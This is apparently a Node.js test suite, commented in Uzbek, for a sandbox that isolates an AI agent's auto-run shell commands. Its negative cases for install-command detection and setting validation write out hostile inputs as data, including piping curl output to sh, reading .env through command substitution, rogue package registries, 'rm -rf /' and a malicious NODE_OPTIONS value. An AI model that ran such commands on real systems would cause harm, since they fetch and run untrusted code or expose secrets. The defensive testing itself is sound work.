// Sandbox testlari (cli/src/sandbox.mjs): platformalar bo'yicha argument quruvchilar (sof funksiyalar,
// soxta aniqlash) va shu mashinada JONLI test — Full auto buyrug'i sirlarni ko'rmaydi, HOME yo'naltirilgan.
// Ishga tushirish: node cli/scripts/test-sandbox.mjs
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import {
  buildBwrapArgs,
  buildContainerArgs,
  buildSandboxExecArgs,
  buildSeatbeltProfile,
  describeSandbox,
  detectSandbox,
  gitIdentity,
  isInstallCommand,
  planSandbox,
  prepareSandboxedRun,
  sandboxEnv,
  sandboxRule,
  sandboxableWorkspace,
  whichSync,
  DEAD_PROXY,
} from "../src/sandbox.mjs";
import { fullAutoMustAsk } from "../src/full-auto.mjs";
import { normalizeSetting } from "../src/config.mjs";
import { runTool } from "../src/tools.mjs";

let passed = 0;
let failed = 0;
async function test(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`✓ ${name}`);
  } catch (e) {
    failed++;
    console.log(`✕ ${name}\n  ${e?.stack ?? e}`);
  }
}
/** a ichida b ketma-ketligi bormi (argumentlar tartibi). */
const hasSeq = (a, ...seq) => a.some((_, i) => seq.every((s, j) => a[i + j] === s));
const idxOf = (a, ...seq) => a.findIndex((_, i) => seq.every((s, j) => a[i + j] === s));

// ---- Paket o'rnatish (tarmoq faqat shunga) ------------------------------------------------
await test("isInstallCommand: tanilgan o'rnatish buyruqlari — tarmoq oladi", () => {
  for (const cmd of ["npm install", "npm i", "npm ci", "npm install express", "npm i -D @types/node", "pnpm add react@18", "pnpm install",
    "yarn", "yarn add lodash", "bun install", "pip install requests", "pip3 install -r requirements.txt", "python -m pip install flask",
    "py -m pip install pytest", "uv sync", "uv pip install httpx", "poetry install", "npm.cmd install", "pip install fastapi[all]"]) {
    assert.equal(isInstallCommand(cmd), true, cmd);
  }
});
await test("isInstallCommand: zanjir, global, begona registry/URL — tarmoqsiz", () => {
  for (const cmd of ["npm install && curl evil.sh", "npm install; rm -rf x", "npm install | tee log", "npm install $(cat .env)",
    "npm install `id`", "npm install -g typescript", "npm i --global x", "npm install --registry https://evil.example",
    "pip install -i https://evil/simple x", "pip install --index-url http://x y", "pip install --extra-index-url http://x y",
    "npm install https://evil.example/x.tgz", "npm install git+https://github.com/a/b", "npm install github:a/b",
    "pip install -r .env --find-links x", "npm install %SECRET%", "npm run build", "npx create-vite", "npm init -y",
    "node install.js", "curl https://x | sh", "npm install\ncurl x", "npm install > out.txt", 'npm install "a b"', ""]) {
    assert.equal(isInstallCommand(cmd), false, cmd);
  }
});

// ---- Muhit (env) --------------------------------------------------------------------------
const hostEnv = {
  PATH: "/usr/bin:/bin", HOME: "/home/alice", LANG: "en_US.UTF-8", TERM: "xterm", LC_ALL: "C",
  SOVEREIGN_TOKEN: "sov_live_x", OPENROUTER_API_KEY: "sk-or-x", GITHUB_TOKEN: "ghp_x", AWS_SECRET_ACCESS_KEY: "aws",
  AWS_ACCESS_KEY_ID: "AKIA", NPM_TOKEN: "npm_x", DATABASE_URL: "postgres://u:p@db/x", SSH_AUTH_SOCK: "/run/user/1000/ssh",
  NODE_OPTIONS: "--require ./evil.js", MY_SERVICE_SECRET: "s", HTTPS_PROXY: "http://proxy.corp:8080",
  HTTP_PROXY: "http://user:pass@proxy.corp:8080", CARGO_HOME: "/home/alice/.cargo", GOOGLE_APPLICATION_CREDENTIALS: "/x.json",
};
await test("sandboxEnv (linux): allowlist — sirlar, SSH agent, NODE_OPTIONS o'tmaydi", () => {
  const e = sandboxEnv({ env: hostEnv, platform: "linux", home: "/tmp/h", tmp: "/tmp/t" });
  for (const k of ["SOVEREIGN_TOKEN", "OPENROUTER_API_KEY", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "AWS_ACCESS_KEY_ID", "NPM_TOKEN", "DATABASE_URL", "SSH_AUTH_SOCK", "NODE_OPTIONS", "MY_SERVICE_SECRET", "GOOGLE_APPLICATION_CREDENTIALS"]) {
    assert.equal(e[k], undefined, k);
  }
  assert.equal(e.PATH, "/usr/bin:/bin");
  assert.equal(e.LANG, "en_US.UTF-8");
  assert.equal(e.LC_ALL, "C");
  assert.equal(e.CARGO_HOME, "/home/alice/.cargo");
  assert.equal(e.HOME, "/tmp/h");
  assert.equal(e.TMPDIR, "/tmp/t");
  assert.equal(e.XDG_CONFIG_HOME, "/tmp/h/.config");
  assert.equal(e.GIT_TERMINAL_PROMPT, "0");
});
await test("sandboxEnv: tarmoqsiz — o'lik proxy; o'rnatishda — parolsiz proxy o'tadi, parollisi yo'q", () => {
  const off = sandboxEnv({ env: hostEnv, platform: "linux", home: "/h", tmp: "/t", net: false });
  for (const k of ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "all_proxy"]) assert.equal(off[k], DEAD_PROXY, k);
  assert.match(off.NO_PROXY, /localhost/);
  const on = sandboxEnv({ env: hostEnv, platform: "linux", home: "/h", tmp: "/t", net: true });
  assert.equal(on.HTTPS_PROXY, "http://proxy.corp:8080");
  assert.equal(on.HTTP_PROXY, undefined, "parolli proxy URL o'tmasligi kerak");
  assert.notEqual(on.https_proxy, DEAD_PROXY);
});
await test("sandboxEnv (win32): USERPROFILE/APPDATA/LOCALAPPDATA yo'naltiriladi, registr farqi bir nusxa", () => {
  const e = sandboxEnv({
    env: { Path: "C:\\Windows", SystemRoot: "C:\\Windows", USERPROFILE: "C:\\Users\\a", APPDATA: "C:\\Users\\a\\AppData\\Roaming", Temp: "C:\\T", GH_TOKEN: "x", ComSpec: "C:\\Windows\\system32\\cmd.exe" },
    platform: "win32", home: "D:\\sbx\\home", tmp: "D:\\sbx\\tmp",
  });
  assert.equal(e.USERPROFILE, "D:\\sbx\\home");
  assert.equal(e.HOME, "D:\\sbx\\home");
  assert.equal(e.APPDATA, "D:\\sbx\\home\\AppData\\Roaming");
  assert.equal(e.LOCALAPPDATA, "D:\\sbx\\home\\AppData\\Local");
  assert.equal(e.TEMP, "D:\\sbx\\tmp");
  assert.equal(Object.keys(e).filter((k) => k.toUpperCase() === "TEMP").length, 1);
  assert.equal(e.GH_TOKEN, undefined);
  assert.equal(e.Path, "C:\\Windows");
  assert.equal(e.ComSpec, "C:\\Windows\\system32\\cmd.exe");
  assert.equal(e.NoDefaultCurrentDirectoryInExePath, "1");
});
await test("sandboxEnv: git identity (faqat ism/email) uzatiladi", () => {
  const e = sandboxEnv({ env: {}, platform: "linux", home: "/h", tmp: "/t", identity: { name: "Bot", email: "bot@example.com" } });
  assert.equal(e.GIT_AUTHOR_NAME, "Bot");
  assert.equal(e.GIT_COMMITTER_EMAIL, "bot@example.com");
});
await test("gitIdentity: ~/.gitconfig [user] dan faqat name/email", () => {
  const d = mkdtempSync(join(tmpdir(), "sov-gid-"));
  writeFileSync(join(d, ".gitconfig"), '[core]\n\tname = no\n[user]\n\tname = "Ali Valiyev"\n\temail = ali@example.com\n\tsigningkey = ABC\n[credential]\n\thelper = store\n');
  assert.deepEqual(gitIdentity(d), { name: "Ali Valiyev", email: "ali@example.com" });
  assert.deepEqual(gitIdentity(join(d, "yoq")), {});
  rmSync(d, { recursive: true, force: true });
});

// ---- Ish papkasi ---------------------------------------------------------------------------
await test("sandboxableWorkspace: ildiz va uy papkasi/ajdodi — yo'q; loyiha — ha", () => {
  assert.equal(sandboxableWorkspace("/home/alice/proj", "/home/alice", "linux"), true);
  assert.equal(sandboxableWorkspace("/home/alice", "/home/alice", "linux"), false);
  assert.equal(sandboxableWorkspace("/home", "/home/alice", "linux"), false);
  assert.equal(sandboxableWorkspace("/", "/home/alice", "linux"), false);
  assert.equal(sandboxableWorkspace("/home/alicex", "/home/alice", "linux"), true);
  assert.equal(sandboxableWorkspace("C:\\Users\\A", "c:\\users\\a", "win32"), false);
  assert.equal(sandboxableWorkspace("C:\\", "C:\\Users\\a", "win32"), false);
  assert.equal(sandboxableWorkspace("D:\\proj", "C:\\Users\\a", "win32"), true);
});

// ---- Linux: bubblewrap ----------------------------------------------------------------------
await test("bwrap: ro /, maxfiy joylar tmpfs, vositalar ro, ish papkasi rw, tarmoq yo'q", () => {
  const existing = new Set(["/var/tmp", "/run", "/home", "/mnt", "/home/alice/.nvm", "/home/alice/.cargo"]);
  const a = buildBwrapArgs({ command: "npm test", workspace: "/home/alice/proj", home: "/home/alice", exists: (p) => existing.has(p) });
  assert.ok(hasSeq(a, "--unshare-all"));
  assert.ok(!a.includes("--share-net"), "tarmoq yopiq bo'lishi kerak");
  assert.ok(hasSeq(a, "--die-with-parent"));
  assert.ok(hasSeq(a, "--new-session"));
  assert.ok(hasSeq(a, "--ro-bind", "/", "/"));
  assert.ok(hasSeq(a, "--tmpfs", "/tmp"));
  assert.ok(hasSeq(a, "--tmpfs", "/run"), "docker.sock / ssh-agent yopiladi");
  assert.ok(hasSeq(a, "--tmpfs", "/home"), "uy papkalari yashiriladi");
  assert.ok(hasSeq(a, "--tmpfs", "/mnt"));
  assert.ok(!hasSeq(a, "--tmpfs", "/media"), "mavjud bo'lmagan yo'l qo'shilmaydi");
  assert.ok(hasSeq(a, "--ro-bind", "/home/alice/.nvm", "/home/alice/.nvm"));
  assert.ok(!a.includes("/home/alice/.ssh"));
  assert.ok(hasSeq(a, "--bind", "/home/alice/proj", "/home/alice/proj"));
  // Tartib: yashirish → vositalar → ish papkasi.
  assert.ok(idxOf(a, "--tmpfs", "/home") < idxOf(a, "--ro-bind", "/home/alice/.nvm", "/home/alice/.nvm"));
  assert.ok(idxOf(a, "--ro-bind", "/home/alice/.nvm", "/home/alice/.nvm") < idxOf(a, "--bind", "/home/alice/proj", "/home/alice/proj"));
  assert.deepEqual(a.slice(-4), ["--", "/bin/sh", "-c", "npm test"]);
  assert.ok(hasSeq(a, "--chdir", "/home/alice/proj"));
});
await test("bwrap: o'rnatishda --share-net, DNS va .env fayllari yashiriladi", () => {
  const a = buildBwrapArgs({ command: "npm install", workspace: "/srv/p", home: "/root", net: true, exists: () => true, envFiles: ["/srv/p/.env", "/srv/p/.env.local"] });
  assert.ok(hasSeq(a, "--unshare-all", "--share-net"));
  assert.ok(hasSeq(a, "--ro-bind-try", "/run/systemd/resolve", "/run/systemd/resolve"));
  assert.ok(hasSeq(a, "--tmpfs", "/root"));
  assert.ok(hasSeq(a, "--ro-bind", "/dev/null", "/srv/p/.env"));
  assert.ok(hasSeq(a, "--ro-bind", "/dev/null", "/srv/p/.env.local"));
  assert.ok(idxOf(a, "--bind", "/srv/p", "/srv/p") < idxOf(a, "--ro-bind", "/dev/null", "/srv/p/.env"));
  const off = buildBwrapArgs({ command: "ls", workspace: "/srv/p", home: "/root", exists: () => true, envFiles: ["/srv/p/.env"] });
  assert.ok(!off.includes("/srv/p/.env"), "tarmoqsiz — .env yashirilmaydi (ishlab chiqish uchun kerak)");
});

// ---- macOS: sandbox-exec -------------------------------------------------------------------
await test("seatbelt: yozish faqat ish papkasi + tmp, uy papkasi o'qilmaydi, tarmoq yopiq", () => {
  const { profile, params } = buildSeatbeltProfile({ workspace: "/Users/a/proj", privateDir: "/private/var/folders/x/T/sov", home: "/Users/a", exists: (p) => p === "/Users/a/.nvm" });
  assert.match(profile, /^\(version 1\)/);
  assert.match(profile, /\(deny file-write\*\)/);
  assert.match(profile, /\(allow file-write\* \(subpath \(param "WS"\)\) \(subpath \(param "PRIV"\)\)/);
  assert.match(profile, /\(deny file-read\* \(subpath \(param "HOME"\)\)\)/);
  assert.match(profile, /\(deny network\*\)/);
  assert.match(profile, /com\.apple\.SecurityServer/);
  assert.equal(params.WS, "/Users/a/proj");
  assert.equal(params.HOME, "/Users/a");
  assert.equal(params.R0, "/Users/a/.nvm");
  assert.ok(Object.values(params).includes("/Users/a/.ssh"));
  assert.ok(Object.values(params).includes("/Users/a/.sovereign"));
  assert.ok(!profile.includes("/Users/a"), "yo'llar profil matniga aralashmaydi (faqat -D parametr)");
  // Yozish/o'qish ruxsati tarmoq/sir qoidalaridan OLDIN (SBPL: oxirgi mos qoida ustun).
  assert.ok(profile.indexOf("(allow file-read* (subpath (param \"WS\"))") < profile.indexOf('(subpath (param "S0"))'));
  const args = buildSandboxExecArgs({ command: "npm test", profile, params });
  assert.equal(args[0], "-p");
  assert.ok(hasSeq(args, "-D", "WS=/Users/a/proj"));
  assert.deepEqual(args.slice(-3), ["/bin/sh", "-c", "npm test"]);
});
await test("seatbelt: o'rnatishda tarmoq ochiq, .env o'qilmaydi", () => {
  const { profile, params } = buildSeatbeltProfile({ workspace: "/w", privateDir: "/p", home: "/Users/a", net: true, envFiles: ["/w/.env"], exists: () => false });
  assert.ok(!profile.includes("(deny network*)"));
  assert.match(profile, /\(deny file-read\* \(literal \(param "E0"\)\)\)/);
  assert.equal(params.E0, "/w/.env");
});

// ---- Konteyner ------------------------------------------------------------------------------
await test("docker: faqat ish papkasi, --network none, capability'larsiz, host env o'tmaydi", () => {
  const a = buildContainerArgs({ engine: "docker", image: "node:22-bookworm-slim", command: "npm test", workspace: "D:\\proj", name: "sov-sbx-1", platform: "win32" });
  assert.deepEqual(a.slice(0, 2), ["run", "--rm"]);
  assert.ok(hasSeq(a, "--network", "none"));
  assert.ok(hasSeq(a, "--cap-drop", "ALL"));
  assert.ok(hasSeq(a, "--security-opt", "no-new-privileges"));
  assert.ok(hasSeq(a, "--mount", "type=bind,source=D:\\proj,target=/workspace"));
  assert.ok(hasSeq(a, "-w", "/workspace"));
  assert.ok(hasSeq(a, "--name", "sov-sbx-1"));
  assert.ok(!a.includes("--user"), "Windows'da --user yo'q");
  assert.ok(!a.some((x) => /TOKEN|OPENROUTER|USERPROFILE/.test(x)));
  assert.ok(hasSeq(a, "-e", "HOME=/tmp"));
  assert.deepEqual(a.slice(-4), ["node:22-bookworm-slim", "sh", "-c", "npm test"]);
  assert.equal(a.filter((x) => x === "-v").length, 0, "boshqa papka ulanmaydi");
});
await test("docker/podman: o'rnatishda bridge; linux'da uid; vergulli yo'l qo'shtirnoqda", () => {
  const a = buildContainerArgs({ engine: "docker", command: "npm i", workspace: "/w,x", name: "n", platform: "linux", uid: 1000, gid: 1000, net: true });
  assert.ok(hasSeq(a, "--network", "bridge"));
  assert.ok(hasSeq(a, "--user", "1000:1000"));
  assert.ok(hasSeq(a, "--mount", 'type=bind,"source=/w,x",target=/workspace'));
  const p = buildContainerArgs({ engine: "podman", command: "ls", workspace: "/w", name: "n", platform: "linux", uid: 1000, gid: 1000 });
  assert.ok(p.includes("--userns=keep-id"));
  assert.ok(!p.includes("--user"));
});

// ---- Aniqlash (soxta) -----------------------------------------------------------------------
const fakeRun = (table) => async (file, args) => {
  const key = `${file} ${args[0]}${args[0] === "image" ? " inspect" : ""}`;
  const r = table[key] ?? table[file] ?? { code: 127 };
  return { code: r.code, stdout: r.stdout ?? "", stderr: r.stderr ?? "" };
};
await test("detect linux: bwrap ishlaydi → full", async () => {
  const r = await detectSandbox({ platform: "linux", deps: { which: (n) => (n === "bwrap" ? "/usr/bin/bwrap" : null), run: fakeRun({ "/usr/bin/bwrap": { code: 0 } }) } });
  assert.equal(r.level, "full");
  assert.equal(r.method, "bwrap");
  assert.equal(r.path, "/usr/bin/bwrap");
});
await test("detect linux: bwrap yiqiladi → docker (image bor) → container", async () => {
  const r = await detectSandbox({
    platform: "linux",
    deps: {
      which: (n) => ({ bwrap: "/usr/bin/bwrap", docker: "/usr/bin/docker" })[n] ?? null,
      run: fakeRun({ "/usr/bin/bwrap": { code: 1, stderr: "setting up uid map: Permission denied" }, "/usr/bin/docker version": { code: 0, stdout: "27.1\n" }, "/usr/bin/docker image inspect": { code: 0, stdout: "sha256:x" } }),
    },
  });
  assert.equal(r.level, "container");
  assert.equal(r.method, "docker");
  assert.equal(r.fallbackFrom, "bwrap-failed");
});
await test("detect win32: docker yo'q → limited (no-engine)", async () => {
  const r = await detectSandbox({ platform: "win32", deps: { which: () => null, run: fakeRun({}) } });
  assert.equal(r.level, "limited");
  assert.equal(r.reason, "no-engine");
});
await test("detect win32: docker CLI bor, daemon o'chiq → limited (engine-down); image yo'q → no-image", async () => {
  const down = await detectSandbox({ platform: "win32", deps: { which: (n) => (n === "docker" ? "C:\\D\\docker.exe" : null), run: fakeRun({ "C:\\D\\docker.exe version": { code: 1, stderr: "failed to connect" } }) } });
  assert.equal(down.level, "limited");
  assert.equal(down.reason, "engine-down");
  const noimg = await detectSandbox({ platform: "win32", deps: { which: (n) => (n === "docker" ? "C:\\D\\docker.exe" : null), run: fakeRun({ "C:\\D\\docker.exe version": { code: 0, stdout: "27" }, "C:\\D\\docker.exe image inspect": { code: 1 } }) } });
  assert.equal(noimg.level, "limited");
  assert.equal(noimg.reason, "no-image");
});
await test("detect win32: podman ishlaydi → container", async () => {
  const r = await detectSandbox({ platform: "win32", image: "python:3.12-slim", deps: { which: (n) => (n === "podman" ? "C:\\P\\podman.exe" : null), run: fakeRun({ "C:\\P\\podman.exe version": { code: 0, stdout: "5.0" }, "C:\\P\\podman.exe image inspect": { code: 0 } }) } });
  assert.equal(r.level, "container");
  assert.equal(r.method, "podman");
  assert.equal(r.image, "python:3.12-slim");
});
await test("detect darwin: sandbox-exec → full", async () => {
  const r = await detectSandbox({ platform: "darwin", deps: { which: () => null, exists: (p) => p === "/usr/bin/sandbox-exec", run: fakeRun({ "/usr/bin/sandbox-exec": { code: 0 } }) } });
  assert.equal(r.level, "full");
  assert.equal(r.method, "sandbox-exec");
});
await test("whichSync: nisbiy PATH yozuvlari (joriy papka) e'tiborsiz; Windows'da faqat .exe", () => {
  const files = new Set(["C:\\bin\\docker.exe", "C:\\bin\\docker.cmd", "docker.exe"]);
  assert.equal(whichSync("docker", { platform: "win32", env: { PATH: ".;bin;C:\\bin" }, isFile: (p) => files.has(p) }), "C:\\bin\\docker.exe");
  assert.equal(whichSync("bwrap", { platform: "linux", env: { PATH: ".:bin:/usr/bin" }, isFile: (p) => p === "/usr/bin/bwrap" || p === "bin/bwrap" }), "/usr/bin/bwrap");
  assert.equal(whichSync("docker", { platform: "win32", env: { PATH: "C:\\x" }, isFile: () => false }), null);
});

// ---- Reja (rejim × daraja) ------------------------------------------------------------------
const FULL = { level: "full", method: "bwrap", path: "/usr/bin/bwrap" };
const LIM = { level: "limited", method: "env", reason: "no-engine" };
await test("planSandbox: rejimlar", () => {
  const ws = { cwd: "/home/a/p", home: "/home/a", platform: "linux" };
  assert.equal(planSandbox({ mode: "auto", fullAuto: false, info: FULL, ...ws }).level, "none", "oddiy rejim + auto — sandbox yo'q");
  assert.equal(planSandbox({ mode: "auto", fullAuto: true, info: FULL, ...ws }).level, "full");
  assert.equal(planSandbox({ mode: "auto", fullAuto: true, info: LIM, ...ws }).level, "limited");
  assert.equal(planSandbox({ mode: "auto", fullAuto: true, info: LIM, ...ws }).required, false);
  assert.equal(planSandbox({ mode: "off", fullAuto: true, info: FULL, ...ws }).level, "limited", "off — faqat env to'sig'i");
  const req = planSandbox({ mode: "required", fullAuto: true, info: LIM, ...ws });
  assert.equal(req.level, "limited");
  assert.equal(req.required, true, "required + sandbox yo'q — so'raladi");
  assert.equal(planSandbox({ mode: "required", fullAuto: true, info: FULL, ...ws }).required, false);
  assert.equal(planSandbox({ mode: "required", fullAuto: false, info: FULL, ...ws }).level, "full", "required — oddiy rejimda ham sandbox");
  assert.equal(planSandbox({ mode: "required", fullAuto: false, info: LIM, ...ws }).level, "none");
  const home = planSandbox({ mode: "auto", fullAuto: true, info: FULL, cwd: "/home/a", home: "/home/a", platform: "linux" });
  assert.equal(home.level, "limited");
  assert.equal(home.reason, "workspace-home");
  assert.equal(planSandbox({ mode: "bogus", fullAuto: true, info: FULL, ...ws }).level, "full", "noma'lum rejim — auto");
});
await test("fullAutoMustAsk: sandboxRequired → 'sandbox' (Full auto'da ham qo'lda tasdiq)", () => {
  assert.equal(fullAutoMustAsk({ tool: "run_command", command: "npm test", sandboxRequired: true }), "sandbox");
  assert.equal(fullAutoMustAsk({ tool: "run_command", command: "npm test", sandboxRequired: false, sandboxLevel: "limited" }), null);
});
await test("config: sandbox / sandboxImage tekshiruvi", () => {
  assert.deepEqual(normalizeSetting("sandbox", "required"), { ok: true, value: "required" });
  assert.equal(normalizeSetting("sandbox", "yes").ok, false);
  assert.equal(normalizeSetting("sandboxImage", "node:22-bookworm-slim").ok, true);
  assert.equal(normalizeSetting("sandboxImage", "").ok, true);
  assert.equal(normalizeSetting("sandboxImage", "x; rm -rf /").ok, false);
  assert.equal(normalizeSetting("sandboxImage", "--privileged").ok, false);
});
await test("matnlar halol: limited 'TO'SILMAYDI' deydi, full 'tarmoq o'chiq'", () => {
  assert.match(describeSandbox({ level: "limited", info: LIM }), /TO'SILMAYDI/);
  assert.match(describeSandbox({ level: "full", info: FULL }), /bubblewrap/);
  assert.match(describeSandbox({ level: "limited", info: FULL, reason: "workspace-home" }), /uy papkasi/);
  assert.match(sandboxRule({ level: "container" }), /POSIX sh/);
  assert.match(sandboxRule({ level: "limited" }), /CHEKLANGAN/);
});

// ---- JONLI: shu mashinada (Windows'da Docker'siz — limited) ---------------------------------
const origCwd = process.cwd();
const tmp = realpathSync.native(mkdtempSync(join(tmpdir(), "sov-sbx-live-")));
const ws = join(tmp, "ws");
mkdirSync(ws, { recursive: true });
process.chdir(ws);
const SECRETS = {
  SOVEREIGN_TOKEN: "sov_live_SECRET_A1",
  OPENROUTER_API_KEY: "sk-or-SECRET_B2",
  GITHUB_TOKEN: "ghp_SECRET_C3",
  AWS_SECRET_ACCESS_KEY: "SECRET_D4",
  MY_APP_PASSWORD: "SECRET_E5",
  DATABASE_URL: "postgres://u:SECRET_F6@db/x",
};
const saved = {};
for (const [k, v] of Object.entries(SECRETS)) {
  saved[k] = process.env[k];
  process.env[k] = v;
}
const info = await detectSandbox({ force: true });
console.log(`  (bu mashinada: ${info.level} / ${info.method}${info.reason ? ` / ${info.reason}` : ""})`);
const allow = async () => true;
const dumpCmd = process.platform === "win32" ? "set" : "env";
await test(`jonli (${info.level}): Full auto buyrug'i sirli env o'zgaruvchilarini ko'rmaydi`, async () => {
  let meta = null;
  const out = await runTool("run_command", { command: dumpCmd }, async (_q, _f, m) => ((meta = m), true), { fullAuto: true });
  assert.match(out, /^EXIT 0/, out.slice(0, 300));
  for (const [k, v] of Object.entries(SECRETS)) {
    assert.ok(!out.includes(v), `${k} qiymati sandbox ichida ko'rindi`);
  }
  assert.equal(meta?.sandboxLevel, info.level === "full" || info.level === "container" ? info.level : "limited");
  assert.equal(meta?.sandboxRequired, false);
});
await test(`jonli (${info.level}): HOME / USERPROFILE / APPDATA haqiqiy uy papkasi emas`, async () => {
  const cmd = process.platform === "win32" ? "echo U=%USERPROFILE%& echo H=%HOME%& echo A=%APPDATA%& echo L=%LOCALAPPDATA%" : 'echo "H=$HOME"; ls -A "$HOME" | head -50';
  const out = await runTool("run_command", { command: cmd }, allow, { fullAuto: true });
  assert.match(out, /^EXIT 0/, out.slice(0, 300));
  const realHome = homedir();
  if (info.level === "full" && info.method === "bwrap") {
    // bwrap: HOME yo'li o'sha, lekin tmpfs — ichida ~/.ssh, ~/.sovereign yo'q.
    assert.ok(!/\.ssh|\.sovereign|\.aws/.test(out), out);
  } else if (info.level === "container") {
    assert.match(out, /H=\/tmp/);
  } else {
    for (const line of out.split(/\r?\n/).filter((l) => /^[UHAL]=/.test(l))) {
      const v = line.slice(2).trim();
      assert.ok(v && !v.includes("%"), `o'rnatilmagan: ${line}`);
      assert.notEqual(v.toLowerCase(), realHome.toLowerCase(), `haqiqiy uy papkasi: ${line}`);
      assert.match(v, /sov-sandbox-/, `vaqtinchalik papka emas: ${line}`);
    }
  }
});
await test(`jonli (${info.level}): o'lik proxy tarmoqsiz buyruqda, o'rnatish buyrug'ida yo'q`, async () => {
  if (info.level === "container") return; // konteyner: --network none (proxy kerak emas)
  const show = process.platform === "win32" ? "echo P=%HTTPS_PROXY%" : 'echo "P=$HTTPS_PROXY"';
  const out = await runTool("run_command", { command: show }, allow, { fullAuto: true });
  assert.match(out, /P=http:\/\/127\.0\.0\.1:9/);
  const spec = prepareSandboxedRun({ command: "npm install", plan: planSandbox({ mode: "auto", fullAuto: true, info }) });
  assert.equal(spec.net, true);
  assert.notEqual(spec.env?.HTTPS_PROXY, DEAD_PROXY);
  spec.cleanup();
});
await test("jonli: ish papkasiga yozish ishlaydi (sandbox ichida ham)", async () => {
  const cmd = process.platform === "win32" && info.level !== "container" ? "echo salom> out.txt" : "echo salom > out.txt";
  const out = await runTool("run_command", { command: cmd }, allow, { fullAuto: true });
  assert.match(out, /^EXIT 0/, out.slice(0, 300));
  const { readFileSync } = await import("node:fs");
  assert.match(readFileSync(join(ws, "out.txt"), "utf8"), /salom/);
});
await test("jonli: sandbox=required + haqiqiy sandbox yo'q → tasdiq meta'sida required", async () => {
  let meta = null;
  const out = await runTool("run_command", { command: "echo x" }, async (_q, _f, m) => ((meta = m), false), { fullAuto: true, sandbox: "required", sandboxInfo: LIM });
  assert.equal(out, "Foydalanuvchi rad etdi.");
  assert.equal(meta.sandboxRequired, true);
  assert.equal(fullAutoMustAsk(meta), "sandbox");
});
await test("jonli: oddiy rejim (auto) — sandbox'siz, lekin SOVEREIGN_TOKEN baribir o'tmaydi", async () => {
  let meta = null;
  const out = await runTool("run_command", { command: dumpCmd }, async (_q, _f, m) => ((meta = m), true), {});
  assert.equal(meta.sandboxLevel, "none");
  assert.ok(!out.includes(SECRETS.SOVEREIGN_TOKEN));
});

for (const [k, v] of Object.entries(saved)) {
  if (v === undefined) delete process.env[k];
  else process.env[k] = v;
}
process.chdir(origCwd);
try {
  rmSync(tmp, { recursive: true, force: true });
} catch {
  /* Windows: band fayl */
}
console.log(`\n${failed ? "✕" : "✓"} ${passed} o'tdi, ${failed} xato`);
process.exit(failed ? 1 : 0);
